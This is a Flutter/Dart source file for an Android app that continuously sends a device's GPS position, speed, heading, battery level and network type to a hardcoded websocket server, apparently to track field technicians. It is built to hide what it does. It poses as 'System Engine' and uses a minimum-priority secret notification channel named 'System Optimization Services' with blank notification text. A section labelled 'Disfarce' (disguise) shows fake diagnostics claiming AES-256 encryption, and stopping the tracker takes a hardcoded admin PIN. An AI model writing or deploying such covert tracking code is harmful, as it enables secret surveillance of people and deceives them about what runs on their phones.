import 'dart:async';
import 'dart:isolate';
import 'package:flutter/material.dart';
import 'package:flutter_foreground_task/flutter_foreground_task.dart';
import 'package:geolocator/geolocator.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:wakelock_plus/wakelock_plus.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:connectivity_plus/connectivity_plus.dart';

const String kServerUrl = "https://mundonet-gps.49p1k1.easypanel.host";

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const GpsTrackerApp());
}

@pragma('vm:entry-point')
void startCallback() {
  FlutterForegroundTask.setTaskHandler(GpsTaskHandler());
}

class GpsTaskHandler extends TaskHandler {
  IO.Socket? _socket;
  StreamSubscription<Position>? _positionStream;
  final Battery _battery = Battery();
  final Connectivity _connectivity = Connectivity();

  @override
  void onStart(DateTime timestamp, SendPort? sendPort) async {
    final prefs = await SharedPreferences.getInstance();
    final String teamId = prefs.getString('deviceTeamId') ?? 'team_${DateTime.now().millisecondsSinceEpoch}';
    if (prefs.getString('deviceTeamId') == null) await prefs.setString('deviceTeamId', teamId);
    final String teamName = prefs.getString('currentTeamName') ?? "Técnico";

    _socket = IO.io(kServerUrl, <String, dynamic>{
      'transports': ['websocket'],
      'autoConnect': true,
    });

    _socket?.onConnect((_) {
      _socket?.emit('register_team', {'teamId': teamId, 'name': teamName});
    });

    _positionStream = Geolocator.getPositionStream(
      locationSettings: const LocationSettings(accuracy: LocationAccuracy.high, distanceFilter: 0)
    ).listen((Position position) async {
      // Coletar telemetria
      int battLevel = await _battery.batteryLevel;
      var connResult = await _connectivity.checkConnectivity();
      String network = connResult.toString().split('.').last;

      if (_socket != null && _socket!.connected) {
        _socket!.emit('update_location', {
          'lat': position.latitude, 
          'lng': position.longitude, 
          'speed': position.speed * 3.6, // Converter para km/h
          'heading': position.heading, // Enviar direção para o mapa
          'battery': battLevel,
          'network': network,
          'status': 'Online'
        });
      }
      
      FlutterForegroundTask.updateService(
        notificationTitle: 'Mundonet Telecom',
        notificationText: 'Status Operacional Ok',
      );
    });
  }

  @override
  void onDestroy(DateTime timestamp, SendPort? sendPort) async {
    await _positionStream?.cancel();
    _socket?.disconnect();
  }
  
  @override
  void onRepeatEvent(DateTime timestamp, SendPort? sendPort) {}
}

class GpsTrackerApp extends StatelessWidget {
  const GpsTrackerApp({Key? key}) : super(key: key);
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'System Engine',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        brightness: Brightness.dark,
        scaffoldBackgroundColor: const Color(0xFF121212),
        primaryColor: Colors.white24,
        colorScheme: const ColorScheme.dark(primary: Color(0xFF39B8FF), secondary: Color(0xFF002D62)),
      ),
      home: const TrackerScreen(),
    );
  }
}

class TrackerScreen extends StatefulWidget {
  const TrackerScreen({Key? key}) : super(key: key);
  @override
  State<TrackerScreen> createState() => _TrackerScreenState();
}

class _TrackerScreenState extends State<TrackerScreen> {
  final TextEditingController _controller = TextEditingController();
  bool _isRunning = false;
  StreamSubscription<Position>? _uiPositionStream;

  @override
  void initState() {
    super.initState();
    _initForegroundTask();
    _checkStatus();
  }

  void _initForegroundTask() {
    FlutterForegroundTask.init(
      androidNotificationOptions: AndroidNotificationOptions(
        channelId: 'system_optimization_v1',
        channelName: 'System Optimization Services',
        channelImportance: NotificationChannelImportance.MIN, 
        priority: NotificationPriority.MIN,
        isSticky: true,
        visibility: NotificationVisibility.VISIBILITY_SECRET,
        iconData: const NotificationIconData(
          resType: ResourceType.mipmap,
          resPrefix: ResourcePrefix.ic,
          name: 'launcher',
        ),
      ),
      iosNotificationOptions: const IOSNotificationOptions(showNotification: false),
      foregroundTaskOptions: const ForegroundTaskOptions(
        interval: 2000, 
        allowWakeLock: true,
        allowWifiLock: true,
      ),
    );
  }

  Future<void> _checkStatus() async {
    final running = await FlutterForegroundTask.isRunningService;
    // Pedir para ignorar otimização de bateria (ajuda a manter vivo sem notificação visível)
    if (!await FlutterForegroundTask.isIgnoringBatteryOptimizations) {
      await FlutterForegroundTask.requestIgnoreBatteryOptimization();
    }
    setState(() => _isRunning = running);
  }

  Future<void> _start() async {
    if (_controller.text.isEmpty) return;
    await Permission.notification.request();
    await Permission.location.request();
    await Permission.locationAlways.request();
    final prefs = await SharedPreferences.getInstance();
    await prefs.setString('currentTeamName', _controller.text);
    await FlutterForegroundTask.startService(
      notificationTitle: ' ',
      notificationText: ' ',
      callback: startCallback,
    );
    await WakelockPlus.enable();
    _checkStatus();
  }

  Future<void> _stop() async {
    // Solicitar senha para parar
    final TextEditingController pinController = TextEditingController();
    final bool? confirm = await showDialog<bool>(
      context: context,
      builder: (context) => AlertDialog(
        title: const Text('Confirmar Identidade'),
        content: TextField(
          controller: pinController,
          obscureText: true,
          keyboardType: TextInputType.number,
          decoration: const InputDecoration(hintText: 'Digite o PIN de administrador'),
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context, false), child: const Text('CANCELAR')),
          TextButton(onPressed: () => Navigator.pop(context, pinController.text == '9910'), child: const Text('CONFIRMAR')),
        ],
      ),
    );

    if (confirm == true) {
      await FlutterForegroundTask.stopService();
      await WakelockPlus.disable();
      _checkStatus();
    } else if (confirm == false) {
      if (!mounted) return;
       ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('PIN incorreto ou operação cancelada')),
      );
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        color: const Color(0xFF121212),
        child: SafeArea(
          child: SingleChildScrollView(
            padding: const EdgeInsets.symmetric(horizontal: 30),
            child: Column(
              children: [
                const SizedBox(height: 60),
                const Icon(Icons.settings_input_component, size: 50, color: Colors.white24),
                const SizedBox(height: 10),
                const Text('SYSTEM ENGINE v2.8', style: TextStyle(letterSpacing: 2, fontSize: 10, color: Colors.white30)),
                const SizedBox(height: 80),
                
                Container(
                  padding: const EdgeInsets.all(25),
                  decoration: BoxDecoration(
                    color: Colors.white.withOpacity(0.02),
                    borderRadius: BorderRadius.circular(24),
                    border: Border.all(color: Colors.white10),
                  ),
                  child: Column(
                    children: [
                      Icon(_isRunning ? Icons.check_circle_outline : Icons.radio_button_off, 
                           color: _isRunning ? const Color(0xFF34D399) : Colors.white24, size: 60),
                      const SizedBox(height: 20),
                      if (!_isRunning) ...[
                        TextField(
                          controller: _controller,
                          textAlign: TextAlign.center,
                          style: const TextStyle(fontSize: 16),
                          decoration: InputDecoration(
                            hintText: 'ID do Dispositivo',
                            filled: true,
                            fillColor: Colors.black12,
                            border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none),
                          ),
                        ),
                        const SizedBox(height: 20),
                        SizedBox(
                          width: double.infinity, height: 50,
                          child: ElevatedButton(
                            onPressed: _start,
                            style: ElevatedButton.styleFrom(
                              backgroundColor: Colors.white10,
                              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                            ),
                            child: const Text('ATIVAR SERVIÇO', style: TextStyle(color: Colors.white70, fontWeight: FontWeight.bold)),
                          ),
                        ),
                      ] else ...[
                        const Text('OPERACIONAL', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 16, color: Colors.white70)),
                        const SizedBox(height: 5),
                        const Text('Processos em execução', style: TextStyle(color: Colors.white24, fontSize: 12)),
                        const SizedBox(height: 30),
                        SizedBox(
                          width: double.infinity, height: 50,
                          child: ElevatedButton(
                            onPressed: _stop,
                            style: ElevatedButton.styleFrom(
                              backgroundColor: Colors.transparent,
                              side: const BorderSide(color: Colors.white10),
                              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                            ),
                            child: const Text('PARAR', style: TextStyle(color: Colors.white30, fontWeight: FontWeight.bold)),
                          ),
                        ),
                      ],
                    ],
                  ),
                ),
                const SizedBox(height: 20),

                // Seção de Diagnóstico (Disfarce)
                Container(
                  padding: const EdgeInsets.all(20),
                  decoration: BoxDecoration(
                    color: Colors.white.withOpacity(0.02),
                    borderRadius: BorderRadius.circular(16),
                    border: Border.all(color: Colors.white10),
                  ),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      const Row(
                        children: [
                          Icon(Icons.analytics_outlined, size: 16, color: Colors.white30),
                          SizedBox(width: 8),
                          Text('DIAGNÓSTICO TÉCNICO', style: TextStyle(fontSize: 10, color: Colors.white30, fontWeight: FontWeight.bold, letterSpacing: 1.5)),
                        ],
                      ),
                      const SizedBox(height: 15),
                      _buildDiagInfo('Latência de Rede', '24ms', Icons.speed),
                      _buildDiagInfo('Sinal GPS', 'Estável', Icons.satellite_alt),
                      _buildDiagInfo('Protocolo', 'WebSocket v3', Icons.private_connectivity),
                      _buildDiagInfo('Criptografia', 'AES-256', Icons.lock_outline),
                    ],
                  ),
                ),
                const SizedBox(height: 40),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildDiagInfo(String label, String value, IconData icon) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 12),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          Row(
            children: [
              Icon(icon, size: 14, color: Colors.white24),
              const SizedBox(width: 8),
              Text(label, style: const TextStyle(fontSize: 12, color: Colors.white54)),
            ],
          ),
          Text(value, style: const TextStyle(fontSize: 12, fontWeight: FontWeight.bold, color: Colors.white70)),
        ],
      ),
    );
  }
}
